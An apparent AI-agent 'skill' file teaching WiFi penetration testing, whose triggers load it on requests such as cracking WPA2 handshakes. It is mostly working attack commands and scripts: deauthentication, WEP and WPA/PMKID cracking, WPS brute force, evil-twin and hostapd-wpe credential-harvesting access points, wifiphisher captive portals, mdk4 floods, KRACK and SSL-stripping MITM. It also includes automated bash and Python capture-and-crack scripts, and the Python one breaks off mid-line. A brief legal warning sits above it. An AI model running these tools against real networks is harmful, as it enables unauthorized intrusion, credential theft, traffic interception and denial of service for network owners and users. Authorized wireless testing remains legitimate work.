---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security and WiFi penetration testing using aircrack-ng, hashcat, and related tools for 802.11 WEP/WPA/WPA2/WPA3 assessment
triggers:
  - how do I crack WPA2 handshakes
  - set up wireless adapter in monitor mode
  - capture WiFi handshakes with airodump-ng
  - perform deauth attack on wireless network
  - crack WEP encryption with aircrack-ng
  - setup evil twin access point
  - analyze 802.11 wireless traffic
  - perform wireless penetration testing
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive knowledge for wireless security assessment and WiFi penetration testing using the aircrack-ng suite, hashcat, and related tools. It covers 802.11 reconnaissance, traffic analysis, WEP/WPA/WPA2/WPA3 attacks, rogue access points, and enterprise wireless testing.

## Overview

The Wireless Security & WiFi Penetration Testing project is a hands-on curriculum covering:

- **802.11 fundamentals**: Standards, frame types, encryption protocols
- **Wireless reconnaissance**: Network discovery, hidden SSID enumeration, traffic analysis
- **Attack techniques**: WEP cracking, WPA/WPA2 handshake capture, PMKID attacks, evil twin APs
- **Enterprise assessment**: EAP/RADIUS testing, WPA3 exploitation
- **Defense**: Wireless hardening and detection techniques

**License**: CC BY 4.0  
**Platform**: Kali Linux with injection-capable wireless adapters (Atheros AR9271, Ralink RT3070)  
**Primary tools**: aircrack-ng suite, hashcat, hcxdumptool, kismet, hostapd, wireshark

## Prerequisites

Before using this skill, ensure you have:

1. **Injection-capable wireless adapter** (Atheros AR9271 or Ralink RT3070/RT5372 chipset)
2. **Kali Linux** (bare-metal or VM with USB passthrough)
3. **Test environment** (own equipment with explicit authorization)
4. **Basic Linux command-line knowledge**

⚠️ **Legal Warning**: All techniques must only be used on networks you own or have explicit written authorization to test. Unauthorized wireless attacks are illegal.

## Installation & Setup

### Install Required Tools

Most tools come pre-installed on Kali Linux. Install missing packages:

```bash
# Update package list
sudo apt update

# Core wireless tools
sudo apt install -y aircrack-ng

# Additional tools
sudo apt install -y hashcat hcxdumptool hcxtools reaver bully \
  kismet wireshark hostapd dnsmasq wifite bettercap

# Optional: WPA3 testing tools
sudo apt install -y hostapd-wpe freeradius
```

### Adapter Setup & Verification

#### Check Adapter Chipset

```bash
# List USB devices to identify adapter
lsusb

# Check wireless interfaces
iwconfig

# Verify driver support
sudo airmon-ng
```

#### Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor interface (usually wlan0mon)
iwconfig
```

#### Test Packet Injection

```bash
# Test injection capability (essential for attacks)
sudo aireplay-ng --test wlan0mon

# Expected output: Injection is working!
# Should show successful packet injection
```

#### Set Regulatory Domain (Important)

```bash
# Check current regulatory domain
iw reg get

# Set regulatory domain (e.g., US)
sudo iw reg set US

# Verify channels available
sudo iwlist wlan0mon channel
```

### Disable Monitor Mode

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager if needed
sudo systemctl start NetworkManager
```

## Wireless Reconnaissance

### Network Discovery

#### Basic Network Scan

```bash
# Scan all channels and bands
sudo airodump-ng wlan0mon

# Scan specific channel (e.g., channel 6)
sudo airodump-ng --channel 6 wlan0mon

# Scan 5GHz band (channels 36-165)
sudo airodump-ng --band a wlan0mon

# Scan specific band and channel width
sudo airodump-ng --band abg --channel 36 --ht20 wlan0mon
```

#### Targeted Network Capture

```bash
# Capture specific BSSID to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write capture-output \
  wlan0mon

# Output files:
# capture-output-01.cap (packet capture)
# capture-output-01.csv (network details)
# capture-output-01.kismet.csv (Kismet format)
```

#### Hidden SSID Discovery

```bash
# Capture traffic from hidden network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write hidden-ssid \
  wlan0mon

# In another terminal, deauth a client to reveal SSID
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon
```

### Traffic Analysis with Wireshark

```bash
# Capture on monitor interface
sudo wireshark -i wlan0mon -k

# Or analyze captured file
wireshark capture-output-01.cap
```

**Useful Wireshark filters**:
```
wlan.fc.type_subtype == 0x08    # Beacon frames
wlan.fc.type_subtype == 0x00    # Association requests
wlan.fc.type_subtype == 0x0c    # Deauthentication
eapol                            # WPA handshakes
wlan.bssid == aa:bb:cc:dd:ee:ff # Specific AP
```

### Using Kismet for Advanced Recon

```bash
# Start Kismet (opens web interface at http://localhost:2501)
sudo kismet

# Or run in background
sudo kismet --daemonize

# Command-line capture
sudo kismet_cap_linux_wifi --source=wlan0mon
```

## WEP Attacks

WEP is deprecated but still found in legacy environments.

### WEP Cracking with ARP Replay

```bash
# 1. Start capture on target network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write wep-capture \
  wlan0mon

# 2. In another terminal, fake authenticate
sudo aireplay-ng --fakeauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  -h YOUR:MAC:ADDRESS \
  wlan0mon

# 3. ARP replay attack to generate IVs
sudo aireplay-ng --arpreplay \
  -b AA:BB:CC:DD:EE:FF \
  -h YOUR:MAC:ADDRESS \
  wlan0mon

# 4. Once you have 50,000+ IVs, crack the key
sudo aircrack-ng wep-capture-01.cap
```

### WEP Chop-Chop Attack

```bash
# Chop-chop attack (when ARP replay doesn't work)
sudo aireplay-ng --chopchop \
  -b AA:BB:CC:DD:EE:FF \
  -h YOUR:MAC:ADDRESS \
  wlan0mon

# Creates .xor file, use to forge packet
sudo packetforge-ng --arp \
  -a AA:BB:CC:DD:EE:FF \
  -h YOUR:MAC:ADDRESS \
  -k 192.168.1.1 \
  -l 192.168.1.100 \
  -y replay_dec*.xor \
  -w forged-packet

# Inject forged packet
sudo aireplay-ng --interactive \
  -r forged-packet \
  wlan0mon
```

## WPA/WPA2 PSK Attacks

### Handshake Capture

#### Method 1: Passive Capture (Wait for Client)

```bash
# Start capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write wpa-handshake \
  wlan0mon

# Wait for client to connect naturally
# "WPA handshake: AA:BB:CC:DD:EE:FF" appears when captured
```

#### Method 2: Active Deauthentication

```bash
# Start capture in one terminal
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write wpa-handshake \
  wlan0mon

# In another terminal, deauth a connected client
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:ADDRESS \
  wlan0mon

# Deauth all clients (more noisy)
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon
```

#### Verify Handshake Capture

```bash
# Check if handshake is complete
sudo aircrack-ng wpa-handshake-01.cap

# Should show "1 handshake" in output
```

### WPA/WPA2 Cracking with Aircrack-ng

#### Dictionary Attack

```bash
# Basic dictionary crack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  wpa-handshake-01.cap

# With specific BSSID
sudo aircrack-ng -w wordlist.txt \
  -b AA:BB:CC:DD:EE:FF \
  wpa-handshake-01.cap

# With ESSID
sudo aircrack-ng -w wordlist.txt \
  -e "TargetNetwork" \
  wpa-handshake-01.cap
```

### WPA/WPA2 Cracking with Hashcat

#### Convert Capture to Hashcat Format

```bash
# Method 1: Using hcxpcapngtool (modern)
hcxpcapngtool -o hash.hc22000 wpa-handshake-01.cap

# Method 2: Using cap2hashcat (legacy)
cap2hashcat.bin wpa-handshake-01.cap hash.hccapx
```

#### Hashcat Dictionary Attack

```bash
# WPA/WPA2 hash mode: 22000 (modern) or 2500 (legacy)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Resume session
hashcat -m 22000 hash.hc22000 --session=wpa-crack --restore

# Show cracked password
hashcat -m 22000 hash.hc22000 --show
```

#### Hashcat Mask Attack

```bash
# Mask attack for 8-digit password
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 8-char lowercase + digits
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?d?d?d?d

# Custom charset
hashcat -m 22000 hash.hc22000 -a 3 -1 ?l?u ?1?1?1?1?d?d?d?d
```

#### Hashcat Hybrid Attack

```bash
# Dictionary + mask (append digits)
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d

# Mask + dictionary (prepend pattern)
hashcat -m 22000 hash.hc22000 -a 7 ?u?l?l?l wordlist.txt
```

### PMKID Attack (Hashcat)

PMKID attack captures hash without waiting for client connection.

#### Capture PMKID

```bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid-capture.pcapng --enable_status=1

# Or target specific AP
sudo hcxdumptool -i wlan0mon \
  -o pmkid-capture.pcapng \
  --filterlist=targets.txt \
  --enable_status=1

# targets.txt contains BSSIDs (one per line)
```

#### Convert and Crack PMKID

```bash
# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid-capture.pcapng

# Crack with hashcat (mode 22000)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 pmkid.hc22000 wordlist.txt -r rules/best64.rule
```

### Precomputed Tables (Cowpatty)

```bash
# Generate rainbow table (PMK precomputation)
genpmk -f wordlist.txt \
  -d pmk-table.db \
  -s "NetworkSSID"

# Crack with precomputed table
cowpatty -d pmk-table.db \
  -r wpa-handshake-01.cap \
  -s "NetworkSSID"

# Without precomputed table (slower)
cowpatty -f wordlist.txt \
  -r wpa-handshake-01.cap \
  -s "NetworkSSID"
```

## WPS Attacks

### WPS PIN Cracking with Reaver

```bash
# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Reaver brute-force attack
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6 \
  -vv

# With delay (to avoid lockout)
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6 \
  -d 5 \
  -T 0.5 \
  -vv

# Pixie Dust attack (faster, if vulnerable)
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6 \
  -K \
  -vv
```

### WPS PIN Cracking with Bully

```bash
# Basic bully attack
sudo bully wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6

# With verbosity
sudo bully wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6 \
  -v 3
```

## Evil Twin & Rogue AP Attacks

### Evil Twin AP with Hostapd

#### Create Hostapd Configuration

```bash
# evil-twin.conf
cat > evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
EOF
```

#### Launch Evil Twin

```bash
# Start hostapd
sudo hostapd evil-twin.conf

# In another terminal, configure IP and DHCP
sudo ip addr add 192.168.100.1/24 dev wlan0
sudo ip link set wlan0 up

# Start DHCP server (dnsmasq)
cat > dnsmasq-evil.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
EOF

sudo dnsmasq -C dnsmasq-evil.conf -d

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### Evil Twin with WPA (Credential Capture)

```bash
# evil-twin-wpa.conf
cat > evil-twin-wpa.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
wpa=2
wpa_passphrase=TempPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# Launch
sudo hostapd evil-twin-wpa.conf
```

### Automated Evil Twin with Wifiphisher

```bash
# Basic evil twin with captive portal
sudo wifiphisher -aI wlan0 -eI eth0

# Target specific AP
sudo wifiphisher -aI wlan0 \
  -e "TargetNetwork" \
  --handshake-capture

# Custom scenario
sudo wifiphisher -aI wlan0 \
  --phishing-scenario firmware-upgrade
```

### Evil Twin with WiFi Pumpkin 3

```bash
# Install WiFi Pumpkin 3
sudo apt install wifipumpkin3

# Launch interactive mode
sudo wifipumpkin3

# In wp3 shell:
# set interface wlan0
# set ssid FreeWiFi
# start
```

## Wireless Denial of Service

### Deauthentication Attack

```bash
# Deauth specific client
sudo aireplay-ng --deauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:ADDRESS \
  wlan0mon

# Deauth all clients (continuous)
sudo aireplay-ng --deauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon

# Limited deauth (10 packets)
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon
```

### MDK4 Attacks

```bash
# Install mdk4
sudo apt install mdk4

# Beacon flood (creates fake APs)
sudo mdk4 wlan0mon b -c 6

# Deauthentication flood
sudo mdk4 wlan0mon d -c 6 -b targets.txt

# Authentication DoS
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# TKIP Michael shutdown attack
sudo mdk4 wlan0mon m -t AA:BB:CC:DD:EE:FF
```

## Enterprise WPA (EAP/RADIUS) Testing

### Capture Enterprise Credentials

```bash
# Start capture on enterprise network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write enterprise-capture \
  wlan0mon

# Deauth to capture EAP exchange
sudo aireplay-ng --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:ADDRESS \
  wlan0mon
```

### Evil Twin with Hostapd-WPE

Hostapd-WPE captures enterprise credentials.

```bash
# hostapd-wpe.conf
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
channel=6
hw_mode=g

# WPA Enterprise settings
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh

wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# hostapd.eap_user (allow any user)
cat > hostapd.eap_user << 'EOF'
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS-MSCHAPV2 "t" [2]
EOF

# Launch hostapd-wpe
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials appear in console and:
# /var/log/hostapd-wpe/hostapd-wpe.log
```

### Crack Captured MSCHAPv2 Hash

```bash
# Extract challenge/response from hostapd-wpe log
# Format: hashcat mode 5500 (NetNTLMv1)

# Example hash format:
# username:$NETNTLM$challenge$response

# Crack with hashcat
hashcat -m 5500 captured-hash.txt /usr/share/wordlists/rockyou.txt
```

## Advanced Attacks

### WPA-TKIP Michael Exploitation

```bash
# Requires active client connection and TKIP encryption

# 1. Capture data packet from client
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write tkip-capture \
  wlan0mon

# 2. Extract TKIP packet for replay
# Use tkiptun-ng for TKIP attacks
sudo tkiptun-ng -h CLIENT:MAC \
  -a AA:BB:CC:DD:EE:FF \
  -m 60 \
  wlan0mon
```

### WPA3 Dragonblood Attack

WPA3 has known vulnerabilities (Dragonblood).

```bash
# Use Dragonslayer tools
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test WPA3 downgrade vulnerability
./dragonslayer-downgrade.py wlan0mon "WPA3-Network"

# Test side-channel attack
./dragonslayer-sidechannel.py wlan0mon
```

### KRACK Attack (Key Reinstallation)

```bash
# Use krackattacks scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Test client vulnerability
./krack-test-client.py

# MITM attack to exploit KRACK
./krack-all-zero-tk.py wlan0mon
```

## Wireless MITM & Traffic Interception

### Bettercap WiFi Module

```bash
# Start bettercap
sudo bettercap -iface wlan0mon

# In bettercap console:
wifi.recon on
wifi.show

# Deauth attack
wifi.deauth AA:BB:CC:DD:EE:FF

# Create access point for MITM
set wifi.ap.ssid FreeWiFi
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6
wifi.ap
```

### Capture and Decrypt WPA Traffic

After cracking WPA key, decrypt captured traffic:

```bash
# Decrypt with airdecap-ng
airdecap-ng -e "NetworkSSID" \
  -p "CrackedPassword" \
  wpa-capture-01.cap

# Creates decrypted file: wpa-capture-01-dec.cap

# Analyze decrypted traffic
wireshark wpa-capture-01-dec.cap
```

### SSL Strip / Downgrade Attacks

```bash
# Using bettercap
sudo bettercap

# Enable ARP spoofing and SSL stripping
set arp.spoof.targets 192.168.1.100
set http.proxy.sslstrip true
arp.spoof on
http.proxy on
net.sniff on
```

## Automated Tools

### Wifite for Automated Attacks

```bash
# Automated WEP/WPA/WPS attacks
sudo wifite

# Target WPA only, skip WPS
sudo wifite --wpa --no-wps

# Non-interactive with specific wordlist
sudo wifite --wpa \
  --dict /usr/share/wordlists/rockyou.txt \
  --kill

# Target specific network
sudo wifite --bssid AA:BB:CC:DD:EE:FF
```

### Airgeddon

```bash
# Clone and run airgeddon
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# Interactive menu-driven interface for:
# - Monitor mode setup
# - Network scanning
# - WEP/WPA attacks
# - Evil twin attacks
# - DoS attacks
```

## Configuration & Environment

### Environment Variables

For automation scripts, use environment variables:

```bash
# Set adapter interface
export WLAN_IFACE="wlan0"
export WLAN_MON="wlan0mon"

# Set target details
export TARGET_BSSID="AA:BB:CC:DD:EE:FF"
export TARGET_ESSID="TargetNetwork"
export TARGET_CHANNEL="6"

# Set wordlist path
export WORDLIST="/usr/share/wordlists/rockyou.txt"

# Use in scripts
sudo airodump-ng --bssid $TARGET_BSSID \
  --channel $TARGET_CHANNEL \
  --write capture \
  $WLAN_MON
```

### Bash Script: Automated Handshake Capture

```bash
#!/bin/bash
# capture-handshake.sh - Automated WPA handshake capture

set -e

INTERFACE="${1:-wlan0}"
BSSID="$2"
CHANNEL="$3"
ESSID="${4:-target}"

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Usage: $0 <interface> <bssid> <channel> [essid]"
    exit 1
fi

echo "[*] Enabling monitor mode on $INTERFACE"
sudo airmon-ng check kill
sudo airmon-ng start "$INTERFACE"

MON_INTERFACE="${INTERFACE}mon"

echo "[*] Starting capture on $BSSID (channel $CHANNEL)"
sudo airodump-ng --bssid "$BSSID" \
  --channel "$CHANNEL" \
  --write "$ESSID-handshake" \
  "$MON_INTERFACE" &

AIRODUMP_PID=$!
sleep 5

echo "[*] Sending deauth packets"
sudo aireplay-ng --deauth 10 \
  -a "$BSSID" \
  "$MON_INTERFACE"

sleep 10

echo "[*] Stopping capture"
sudo kill $AIRODUMP_PID

echo "[*] Checking for handshake"
if sudo aircrack-ng "$ESSID-handshake-01.cap" | grep -q "1 handshake"; then
    echo "[+] Handshake captured successfully!"
    echo "[+] Output: $ESSID-handshake-01.cap"
else
    echo "[-] No handshake captured. Try again."
fi

echo "[*] Disabling monitor mode"
sudo airmon-ng stop "$MON_INTERFACE"
```

### Python Script: PMKID Capture & Crack

```python
#!/usr/bin/env python3
# pmkid-attack.py - Automated PMKID capture and crack

import subprocess
import sys
import time
import os

def run_command(cmd, check=True):
    """Execute shell command"""
    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if check and result.returncode != 0:
        print(f"[!] Error: {result.stderr}")
        sys.exit(1)
    return result

def capture_pmkid(interface, output_file, duration=60):
    """Capture PMKID hashes"""
    print(f"[*] Capturing PMKID for {duration} seconds...")
    
    cmd = [
        'sudo', 'hcxdumptool',
        '-i', interface,
        '-o', output_file,
        '--enable_status=1'
    ]
    
    proc = subprocess.Popen(cmd)
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    
    print(f"[+] Capture complete: {output_file}")

def convert_to_hashcat(pcap_file, hash_file):
    """Convert pcapng to hashcat format"""
    print(f"[*] Converting to hashcat format...")
    
    cmd = [
        'hcxpcapngtool',
        '-o', hash_file,
        pcap_file
    ]
    
    result = run_command(cmd, check=False)
    
    if not os.path.exists(hash_file):
        print("[!] No PMKID found in capture")
        return False
    
    print(f"[+] Hash file created: {hash_file}")
    return True

def crack_hash(hash_file, wordlist):
    """Crack PMKID with hashcat"""
    print(f"[*] Cracking hash with wordlist: {wordlist}")
    
    cmd = [
        'hashcat',
        '-m', '22000',
        hash_file,
        wordlist,
        '--force'
    ]
    
    result = run_command(cmd, check=False)
    
    # Check if cracked
    cmd_show = ['hashcat', '-m', '22000', hash_file, '--show']
    result = run_command(cmd_show, check=False)
    
    if result.stdout.strip():
        print(f"[+] Password cracked!")
        print(f"[+] Result: {result.stdout.strip()}")
        return True
    else:
        print("[-] Password not found in wordlist")
        return False

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <interface> <wordlist> <duration>")
        sys.exit(1)
    
    interface = sys.argv[1]
    wordlist = sys.argv[2]
    duration = int(sys.argv[3])
    
    pcap_file = "pmkid-capture.pcapng"
    hash_file = "pmkid.hc22000"
    
    # Capture PMKID
    capture_pmkid(interface, pcap_file
